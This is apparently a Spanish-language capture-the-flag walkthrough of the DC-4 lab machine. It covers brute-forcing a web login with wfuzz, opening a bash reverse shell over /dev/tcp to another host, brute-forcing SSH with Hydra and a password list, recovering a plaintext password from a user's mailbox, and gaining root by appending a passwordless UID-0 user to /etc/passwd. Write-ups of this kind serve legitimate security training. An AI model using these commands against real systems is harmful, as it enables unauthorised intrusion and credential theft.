# DC-4
1. Fuerza bruta para identifiacion de credenciales

```bash
# Se tiene que revisar a nivel html el formulario para ver el nombre de las variables.
# Si no regresa un codigo de error o el submit no tiene nombre de variable, se tiene que buscar solo por el user name y la contraeña
# Se busca la longitud en caso de no arrojar un codigo de estatus (200, 404)

$ wfuzz -c -z file,/usr/share/wordlists/rockyou.txt -d "username=admin&password=FUZZ" http://192.168.1.8/login.php

## Oucltar los resultados con 206 ch
wfuzz -c -z file,/usr/share/wordlists/rockyou.txt --hh 206 -d "username=admin&password=FUZZ" http://192.168.1.9/login.php

# ans

=====================================================================
ID           Response   Lines    Word       Chars       Payload               
=====================================================================

000000463:   302        15 L     28 W       367 Ch      "happy" 


```
## Burpsuite
Se hace un reconocimiento de usuarios usando burpsuite
```bash
$ cat /etc/passwd/ | grep "sh"
# ans
root:x:0:0:root:/root:/bin/bash
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
charles:x:1001:1001:Charles,,,:/home/charles:/bin/bash
jim:x:1002:1002:Jim,,,:/home/jim:/bin/bash
sam:x:1003:1003:Sam,,,:/home/sam:/bin/bash

```
+ Se ejecuta la reverse shell:
```bash
bash -c 'bash -i >& /dev/tcp/192.168.1.14/1337 0>&1'

```

## Priv Esc
```bash
# we have this pass
000000
12345
iloveyou
1q2w3e4r5t
1234
123456a
qwertyuiop
monkey
123321
dragon
654321
666666
123
myspace1
a123456
121212
1qaz2wsx
123qwe
123abc
tinkle
target123
gwerty
1g2w3e4r
gwerty123
zag12wsx
7777777
qwerty1
1q2w3e4r
987654321
222222
qwe123
qwerty123
zxcvbnm
555555
112233
fuckyou
asdfghjkl
12345a
123123123
1q2w3e
qazwsx
loveme1
juventus
jennifer1
!~!1
bubbles
samuel
fuckoff
lovers
cheese1
0123456
123asd
999999999
madison
elizabeth1
music
buster1
lauren
david1
tigger1
123qweasd
taylor1
carlos
tinkerbell
samantha1
Sojdlg123aljg
joshua1
poop
stella
myspace123
asdasd5
freedom1
whatever1
xxxxxx
00000
valentina
a1b2c3
741852963
austin
monica
qaz123
lovely1
music1
harley1
family1
spongebob1
steven
nirvana
1234abcd
hellokitty
thomas1
cooper
520520
muffin
christian1
love13
fucku2
arsenal1
lucky7
diablo
apples
george1
babyboy1
crystal
1122334455
player1
aa123456
vfhbyf
forever1
Password
winston
chivas1
sexy
hockey1
1a2b3c4d
pussy
playboy1
stalker
cherry
tweety
toyota
creative
gemini
pretty1
maverick
brittany1
nathan1
letmein1
cameron1
secret1
google1
heaven
martina
murphy
spongebob
uQA9Ebw445
fernando
pretty
startfinding
softball
dolphin1
fuckme
test123
qwerty1234
kobe24
alejandro
adrian
september
aaaaaa1
bubba1
isabella
abc123456
password3
jason1
abcdefg123
loveyou1
shannon
100200
manuel
leonardo
molly1
flowers
123456z
007007
password.
321321
miguel
samsung1
sergey
sweet1
abc1234
windows
qwert123
vfrcbv
poohbear
d123456
school1
badboy
951753
123456c
111
steven1
snoopy1
garfield
YAgjecc826
compaq
candy1
sarah1
qwerty123456
123456l
eminem1
141414
789789
maria
steelers
iloveme1
morgan1
winner
boomer
lolita
nastya
alexis1
carmen
angelo
nicholas1
portugal
precious
jackass1
jonathan1
yfnfif
bitch
tiffany
rabbit
rainbow1
angel123
popcorn
barbara
brandy
starwars1
barney
natalia
jibril04
hiphop
tiffany1
shorty
poohbear1
simone
albert
marlboro
hardcore
cowboys
sydney
alex
scorpio
1234512345
q12345
qq123456
onelove
bond007
abcdefg1
eagles
crystal1
azertyuiop
winter
sexy12
angelina
james
svetlana
fatima
123456k
icecream
popcorn1


# using hydra to ssh brute force attack
hydra -L users.txt -P passwords.txt 192.168.1.12 ssh -V -f

# ans
[ATTEMPT] target 192.168.1.12 - login "jim" - pass "barney" - 472 of 760 [child 8] (0/4)
[ATTEMPT] target 192.168.1.12 - login "jim" - pass "natalia" - 473 of 760 [child 11] (0/4)
[ATTEMPT] target 192.168.1.12 - login "jim" - pass "jibril04" - 474 of 760 [child 5] (0/4)
[22][ssh] host: 192.168.1.12   login: jim   password: jibril04
[STATUS] attack finished for 192.168.1.12 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-06-14 19:15:41

# ACCESS INTO JIN
ssh jim@192.168.1.12

# read email
cat mbox
# ans
From root@dc-4 Sat Apr 06 20:20:04 2019
Return-path: <root@dc-4>
Envelope-to: jim@dc-4
Delivery-date: Sat, 06 Apr 2019 20:20:04 +1000
Received: from root by dc-4 with local (Exim 4.89)
	(envelope-from <root@dc-4>)
	id 1hCiQe-0000gc-EC
	for jim@dc-4; Sat, 06 Apr 2019 20:20:04 +1000
To: jim@dc-4
Subject: Test
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 8bit
Message-Id: <E1hCiQe-0000gc-EC@dc-4>
From: root <root@dc-4>
Date: Sat, 06 Apr 2019 20:20:04 +1000
Status: RO

This is a test.

```
En los servidores Linux, los usuarios se pueden enviar correos entre sí (a menudo automatizados por scripts o por el administrador root). Estos correos se guardan en un formato de texto plano dentro de la ruta `/var/mail/` o `/var/spool/mail/`.

```bash
cat /var/mail/jim
# ans
From charles@dc-4 Sat Apr 06 21:15:46 2019
Return-path: <charles@dc-4>
Envelope-to: jim@dc-4
Delivery-date: Sat, 06 Apr 2019 21:15:46 +1000
Received: from charles by dc-4 with local (Exim 4.89)
	(envelope-from <charles@dc-4>)
	id 1hCjIX-0000kO-Qt
	for jim@dc-4; Sat, 06 Apr 2019 21:15:45 +1000
To: jim@dc-4
Subject: Holidays
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 8bit
Message-Id: <E1hCjIX-0000kO-Qt@dc-4>
From: Charles <charles@dc-4>
Date: Sat, 06 Apr 2019 21:15:45 +1000
Status: O

Hi Jim,

I'm heading off on holidays at the end of today, so the boss asked me to give you my password just in case anything goes wrong.

Password is:  ^xHhA&hvim0y

See ya,
Charles

```
```bash
# doing sudoers to charles
sudo -l
# nas
Matching Defaults entries for charles on dc-4:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User charles may run the following commands on dc-4:
    (root) NOPASSWD: /usr/bin/teehee

```
`teehee` no es un comando estándar de Linux; es un binario personalizado (o renombrado) que se comporta de manera idéntica al comando legítimo tee.

El comando tee sirve para leer de la entrada estándar y escribir en un archivo. Al poder ejecutarlo con privilegios de root (sudo teehee), tienes el poder de escribir lo que quieras en cualquier archivo del sistema, incluso en los archivos restringidos de configuración.

En Linux, la forma más clásica y destructiva de explotar esto para volverse root permanentemente es inyectar un usuario con privilegios de root directamente en el archivo /etc/passwd.

- La Estrategia para ser Root
El archivo /etc/passwd guarda la estructura de los usuarios del sistema. Cada línea tiene el formato:
`usuario:contraseña:UID:GID:descripción:home:shell`

Si se crea una línea donde el UID sea 0 (el ID de root), Linux tratará a ese usuario como al mismísimo root. Y si dejas el campo de la contraseña vacío, podrás loguearte sin escribir clave.

```bash
echo "pwned::0:0:root:/root:/bin/bash" | sudo /usr/bin/teehee -a /etc/passwd
su pwned


```
```bash



888       888          888 888      8888888b.                             888 888 888 888 
888   o   888          888 888      888  "Y88b                            888 888 888 888 
888  d8b  888          888 888      888    888                            888 888 888 888 
888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888 
888d88888b888 d8P  Y8b 888 888      888    888 d88""88b 888 "88b d8P  Y8b 888 888 888 888 
88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P 
8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      "   "   "   "  
888P     Y888  "Y8888  888 888      8888888P"   "Y88P"  888  888  "Y8888  888 888 888 888 


Congratulations!!!

Hope you enjoyed DC-4.  Just wanted to send a big thanks out there to all those
who have provided feedback, and who have taken time to complete these little
challenges.

If you enjoyed this CTF, send me a tweet via @DCAU7.

```


